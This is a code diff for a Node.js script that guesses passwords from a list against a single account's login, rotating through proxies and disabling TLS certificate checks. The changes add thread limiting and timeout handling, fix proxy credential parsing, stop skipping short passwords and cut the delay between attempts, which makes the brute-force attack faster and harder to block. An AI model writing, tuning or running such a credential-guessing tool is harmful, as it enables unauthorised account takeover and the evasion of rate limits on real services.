@@ -16,6 +16,7 @@ process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
  * DO NOT EDIT BELOW THIS LINE
  */
 const USERNAME = config.username;
+let threads = 0;
 
 const logger = Logger.getInstance();
 
@@ -48,6 +49,7 @@ function checkFound() {
 }
 
 async function doWork(password) {
+  threads++;
   for (;;) {
     checkFound();
 
@@ -67,7 +69,7 @@ async function doWork(password) {
       // check if proxy has credentials
       if (split.length >= 4) {
         proxy.user = split[2];
-        proxy.pass = split[4];
+        proxy.pass = split[3];
       }
 
       proxy.address = `${proxy.host}:${proxy.port}`;
@@ -89,6 +91,8 @@ async function doWork(password) {
     } catch (err) {
       // password probably wrong, go to next password
       if (err instanceof AuthFailureError || err instanceof LoginFailureError) {
+        logger.warn(`Password probably wrong - ${password}`);
+        threads--;
         break;
       }
 
@@ -98,9 +102,14 @@ async function doWork(password) {
         continue;
       }
 
+      // request timed out, try next proxy
+      if (err.name === 'AbortError') {
+        logger.error('Request timed out');
+        continue;
+      }
+
       // most likely a proxy error, try next proxy
-      console.error(err);
-      // logger.error(err);
+      logger.error(err);
       continue;
     }
     break;
@@ -108,18 +117,20 @@ async function doWork(password) {
 }
 
 async function start() {
+  logger.info('Starting...');
+  logger.info('Max concurrent threads: ' + config.concurrent_threads);
+
   for (const password of passwords) {
+    // check if threads are full and wait until one is free
+    while (threads >= config.concurrent_threads) {
+      await sleep(1000);
+    }
+
     checkFound();
-    if (!password || password.length < 8) continue;
+    if (!password) continue;
+    logger.info(`Number of threads: ${threads}`);
     doWork(password);
-    await sleep(2000); // if you have thousands of proxies you might not even need this
+    await sleep(500); // if you have thousands of proxies you might not even need this
   }
 }
 start();
-
-// async function test() {
-//   checkFound();
-//   doWork(passwords[0]);
-//   await sleep(2000);
-// }
-// test();
